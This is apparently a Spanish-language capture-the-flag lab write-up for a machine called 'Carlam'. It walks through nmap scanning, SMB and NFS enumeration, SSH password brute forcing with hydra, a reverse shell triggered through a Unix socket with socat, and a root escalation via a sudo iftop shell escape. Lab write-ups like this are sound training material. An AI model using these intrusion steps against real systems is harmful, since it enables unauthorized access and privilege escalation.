# Máquina Carlam

### Reconocimiento de la Ip de la máquina víctima

![alt text](image.png)

### Puertos abiertos

sudo nmap -sS --disable-arp-ping --min-rate 6000 -p- --open -vvv -Pn 10.0.2.23

![alt text](image-1.png)

### Servicios y versiones

sudo nmap -sVC --min-rate 6000 -p22,111,135,139,445 -vvv -Pn 10.0.2.23

![alt text](image-2.png)

![alt text](image-3.png)

### Explotación

Enumeré los usuarios con enum4linux

enum4linux 10.0.2.23

![alt text](image-4.png)

hacemos ataque de diccionario con nxc para ver contraseñas

![alt text](image-5.png)

Listo lo que hay en nfs:

showmount -e 10.0.2.23

![alt text](image-6.png)

montamos /srv/share en kali

![alt text](image-7.png)

lo que encontré dentro del montaje:

![alt text](image-8.png)

lo que se me ocurrió es hacer un diccionario con los nombres de usuarios encontrados pero en formato leet

![alt text](image-9.png)

hice un ataque con hydra hacia ssh, usando los usuarios anteriormente encontrados.

![alt text](image-10.png)

me conecté por ssh con las credenciales encontradas.

![alt text](image-11.png)

visualicé todos los usuarios

![alt text](image-12.png)

utilizando linpeas encontré:

![alt text](image-13.png)

veo a quién le pertenece

![alt text](image-14.png)

verifico que comandos puedo ejecutar en el archivo.

![alt text](image-15.png)

me conecto por ssh con las credenciales de carlampio en otra terminal y me pongo en escucha en el puerto 4444 y en la primera conexión de ssh ejecuto:

echo -n 'create_reverse_shell' | socat - UNIX-CONNECT:/tmp/app.sock

![alt text](image-16.png)

en la otra conexión ssh:

![alt text](image-17.png)

en /home/xiroi/.conf/.scrt encontré:

![alt text](image-18.png)

lo descifré con base64 decode

![alt text](image-19.png)

camié al usuario aitana

![alt text](image-20.png)


### Escalar privilegios

ejecutamos sudo -l

![alt text](image-21.png)

sudo /usr/sbin/iftop

luego presionamos h , luego ! (shell command)

y escribimos /bin/ash

listo somos root


